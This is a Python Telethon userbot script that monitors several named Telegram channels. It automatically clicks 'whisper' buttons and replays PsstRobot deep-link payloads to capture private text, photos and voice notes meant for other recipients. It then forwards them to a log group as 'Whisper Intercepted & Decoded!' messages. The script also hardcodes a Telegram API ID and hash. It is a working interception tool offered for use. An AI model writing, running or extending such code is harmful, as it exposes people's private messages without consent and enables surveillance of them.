import asyncio
from datetime import datetime
import os
import sys
import time
import traceback
from aiohttp import web
from telethon import TelegramClient, events
from telethon.sessions import StringSession

# ==================== CONFIGURATION ====================
API_ID = 23782654
API_HASH = "5b001caca4f436c940fea5e060f0a3c0"
SESSION_STRING = os.environ.get("SESSION_STRING")

# Target Channels
TARGET_CHANNELS = [
    "chatpateee", -1002133821583,
    "its_diyaa", -1004469467503,
    "UnhingedAspirand", -1003954728685,
    "channelizpublick", -1004303326817,
    "fewmehh", -1004466801780
]

WHISPER_BOT_ID = 518335359 # @PsstRobot
LOG_GROUP_ID = -1004402300724

# Global variable to track the last clicked channel for media whispers
last_context = {"chat_title": "Target Channel", "msg_link": "#", "start_time": 0}

client = TelegramClient(StringSession(SESSION_STRING), API_ID, API_HASH)

# ==================== 1. CHANNEL HANDLER (TEXT & DEEP LINKS) ====================
@client.on(events.NewMessage(chats=TARGET_CHANNELS))
async def channel_handler(event):
    if not event.buttons:
        return

    start_time = time.perf_counter()
    chat_name = event.chat.title if event.chat else "Target Channel"
    
    # URL Generation (Fixed)
    chat = await event.get_chat()
    if getattr(chat, "username", None):
        msg_link = f"https://t.me/{chat.username}/{event.id}"
    else:
        clean_id = str(event.chat_id).replace("-100", "")
        msg_link = f"https://t.me/c/{clean_id}/{event.id}"

    try:
        # STEP 1: Check for Advanced Media Payload (Deep Link)
        payload = None
        for row in event.buttons:
            for btn in row:
                if btn.url and 'PsstRobot?start=' in btn.url:
                    payload = btn.url.split('start=')[-1]
                    break
        
        if payload:
            # Store context for the DM Handler to use
            last_context.update({"chat_title": chat_name, "msg_link": msg_link, "start_time": start_time})
            await client.send_message(WHISPER_BOT_ID, f"/start {payload}")
            print(f"📡 Media Whisper payload sent for [{chat_name}]")
            return

        # STEP 2: Handle Normal Text Whisper (Popup)
        res = await event.click(0)
        secret_text = None
        if hasattr(res, 'message') and res.message:
            secret_text = res.message
        elif isinstance(res, str):
            secret_text = res

        if secret_text and "advanced" not in secret_text.lower():
            elapsed_ms = round((time.perf_counter() - start_time) * 1000, 2)
            
            log_payload = (
                f"🔓 **Whisper Intercepted & Decoded!**\n\n"
                f"📝 **Secret Message:**\n{secret_text}\n\n"
                f"📍 **Channel:** {chat_name}\n"
                f"⚡ **Speed:** {elapsed_ms} ms\n"
                f"🔗 [Message Link]({msg_link})"
            )
            await client.send_message(LOG_GROUP_ID, log_payload)
            print(f"✅ Text Decoded: {chat_name} ({elapsed_ms}ms)")

    except Exception as e:
        print(f"❌ Channel Handler Error: {e}")

# ==================== 2. BOT DM HANDLER (MEDIA / PHOTO / VN) ====================
@client.on(events.NewMessage(from_users=WHISPER_BOT_ID))
async def bot_dm_handler(event):
    # Ignore commands/setup
    if event.message.text and ("/start" in event.message.text or "Preparing" in event.message.text):
        return

    try:
        elapsed_ms = round((time.perf_counter() - last_context["start_time"]) * 1000, 2)
        media_type = "Media"
        if event.photo: media_type = "Photo"
        elif event.voice: media_type = "Voice Note"
        
        log_payload = (
            f"🔓 **Whisper Intercepted & Decoded!**\n\n"
            f"📝 **Secret Message:**\n[Advanced {media_type} Whisper]\n"
            f"{event.message.text if event.message.text else ''}\n\n"
            f"📍 **Channel:** {last_context['chat_title']}\n"
            f"⚡ **Speed:** {elapsed_ms} ms\n"
            f"🔗 [Message Link]({last_context['msg_link']})"
        )

        await client.send_message(LOG_GROUP_ID, log_payload, file=event.message.media if event.message.media else None)
        await client.send_read_acknowledge(event.chat_id)
        print(f"✅ Media Redirected: {last_context['chat_title']} ({elapsed_ms}ms)")

    except Exception as e:
        print(f"❌ DM Handler Error: {e}")

# ==================== WEB SERVER & STARTUP ====================
async def handle_ping(request): return web.Response(text="Bot is Active")
async def main():
    await client.start()
    app = web.Application(); app.router.add_get("/", handle_ping)
    runner = web.AppRunner(app); await runner.setup()
    await web.TCPSite(runner, "0.0.0.0", int(os.environ.get("PORT", 8080))).start()
    await client.get_dialogs()
    print("🔥 Bot Ready! All Formats & Media Supported.")
    await client.run_until_disconnected()

if __name__ == "__main__": asyncio.run(main())
